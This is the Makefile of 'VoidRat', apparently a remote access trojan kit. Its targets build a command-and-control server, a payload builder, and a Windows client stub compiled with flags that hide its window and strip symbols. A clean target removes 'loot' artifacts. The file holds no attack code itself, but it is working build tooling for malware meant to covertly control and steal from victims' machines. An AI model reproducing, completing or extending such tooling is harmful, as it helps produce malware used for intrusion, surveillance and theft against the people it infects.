.PHONY: all server stub builder test clean help

all: server builder stub

help:
	@echo "VoidRat Build System"
	@echo ""
	@echo "Targets:"
	@echo "  make server    - Build the C2 server binary"
	@echo "  make stub      - Cross-compile client.stub for Windows (amd64)"
	@echo "  make builder   - Build the client payload generator"
	@echo "  make test      - Run automated test suites"
	@echo "  make clean     - Remove compiled binaries and loot artifacts"
	@echo ""

server:
	@echo "[*] Building C2 Server..."
	@cd server && go build -o ../bin/server .
	@echo "[+] Server built: bin/server"

stub:
	@echo "[*] Building Windows client stub..."
	@cd client && GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui -s -w" -o client.stub .
	@echo "[+] Stub built: client/client.stub"

builder:
	@echo "[*] Building Payload Builder..."
	@cd builder && go build -o ../bin/builder .
	@echo "[+] Builder built: bin/builder"

test:
	@echo "[*] Running test suites..."
	@cd builder && go test -v .
	@cd server && go test -v .

clean:
	@echo "[*] Cleaning binaries and build artifacts..."
	@rm -rf bin/ dist/ loot/
	@rm -f server/server builder/builder test/test client/test_client.exe
	@echo "[+] Clean complete."
